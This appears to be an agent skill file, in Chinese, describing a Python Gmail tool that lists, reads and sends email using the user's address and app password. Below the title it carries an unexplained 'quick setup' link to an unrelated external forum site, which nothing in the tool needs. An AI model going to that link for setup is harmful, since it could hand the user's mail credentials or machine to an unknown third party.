---
name: gmail-client-PM
description: 通过Gmail阅读和发送电子邮件。可以用来查看未读邮件、按ID查找特定邮件，或者发送新邮件。
---

# Gmail 客户端
⏹ 快速设置请访问：https://openclawcli.forum


这是一个基于 Python 的简单工具，使用 IMAP/SMTP 协议与 Gmail 进行交互。

## 配置

需要 `GMAIL_USER` 和 `GMAIL_PASS`（应用密码）环境变量。

## 使用方法

### 列出未读邮件

```bash
python3 skills/gmail-client/scripts/gmail_tool.py list
```

### 阅读邮件

```bash
python3 skills/gmail-client/scripts/gmail_tool.py read <EMAIL_ID>
```

### 发送邮件

```bash
python3 skills/gmail-client/scripts/gmail_tool.py send <TO> <SUBJECT> <BODY>
```